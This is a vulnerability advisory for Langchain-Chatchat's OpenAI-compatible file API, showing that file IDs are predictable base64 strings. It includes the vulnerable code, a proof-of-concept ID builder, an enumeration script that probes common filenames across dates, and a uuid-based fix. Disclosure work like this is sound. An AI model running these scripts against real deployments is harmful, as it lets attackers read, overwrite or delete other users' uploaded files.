# Vuln-3: Predictable File Identifier Enables Targeted File Access

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vendor** | chatchat-space: https://github.com/chatchat-space/Langchain-Chatchat |
| **Product** | Langchain-Chatchat |
| **Affected Versions** | 0.3.x (at least 0.3.1.3) |
| **Vulnerability Type** | CWE-330: Use of Insufficiently Random Values |
| **Affected File** | `libs/chatchat-server/chatchat/server/api_server/openai_routes.py:229-235` |
| **Severity** | Medium |
| **CVSS 3.1** | AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N — 5.4 |

## Description

Langchain-Chatchat generates file identifiers for its OpenAI-compatible `/v1/files` API by base64-encoding the string `{purpose}/{date}/{filename}`. This identifier is fully deterministic with no random component. An attacker who knows or can guess the upload date and filename can construct valid file identifiers for any uploaded file without prior access, enabling targeted file reads, overwrites, or deletion through the `/v1/files/{file_id}` endpoints.

### Vulnerable Code

```python
# openai_routes.py:229-235
def _get_file_id(purpose, created_at, filename):
    today = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d")
    return base64.urlsafe_b64encode(f"{purpose}/{today}/{filename}".encode()).decode()
```

The file_id is simply: `base64("assistants/2026-04-01/photo.png")`

### Reverse Engineering

```python
# openai_routes.py:255-257
def _get_file_path(file_id: str) -> str:
    file_id = base64.urlsafe_b64decode(file_id).decode()
    return os.path.join(Settings.basic_settings.BASE_TEMP_DIR, "openai_files", file_id)
```

## Attack Vector

An attacker can construct any file_id without needing to observe any upload:

```python
import base64
from datetime import datetime

# Construct file_id for any known/guessed filename
today = datetime.now().strftime("%Y-%m-%d")
filename = "photo.png"
file_id = base64.urlsafe_b64encode(
    f"assistants/{today}/{filename}".encode()
).decode()

# Now use this to:
# - Read:   GET  /v1/files/{file_id}/content
# - Delete: DELETE /v1/files/{file_id}
# - Overwrite: POST /v1/files with same filename
```

### Enumeration

For the paste image path, filenames are MD5 hashes. For the file upload path, filenames come from the user's original file. Common filenames (`photo.png`, `image.png`, `screenshot.png`) can be enumerated across dates:

```python
import base64, requests
from datetime import datetime, timedelta

API = "http://127.0.0.1:7861"
common_names = ["photo.png", "image.png", "screenshot.png", "test.png"]

for days_ago in range(30):
    date = (datetime.now() - timedelta(days=days_ago)).strftime("%Y-%m-%d")
    for name in common_names:
        fid = base64.urlsafe_b64encode(f"assistants/{date}/{name}".encode()).decode()
        resp = requests.get(f"{API}/v1/files/{fid}/content")
        if resp.status_code == 200:
            print(f"Found: {date}/{name} ({len(resp.content)} bytes)")
```

## Impact

- **Targeted Access**: Attacker can read, overwrite, or delete specific files without enumeration
- **Enables Other Attacks**: Predictable IDs are a prerequisite for Vuln-2 (targeted overwrite) and Vuln-4 (unauthorized read)
- **No Audit Trail**: File access does not log requesting identity

## Remediation

```python
import uuid

def _get_file_id(purpose, created_at, filename):
    today = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d")
    unique_id = uuid.uuid4().hex
    return base64.urlsafe_b64encode(
        f"{purpose}/{today}/{unique_id}_{filename}".encode()
    ).decode()
```

## Credits

- Vulnerability Discovery: [dem0]
- Vulnerability Analysis: [dem0]

## Disclaimer

This vulnerability report is provided for educational and authorized security research purposes only. The information contained herein should be used responsibly and in accordance with applicable laws and regulations.
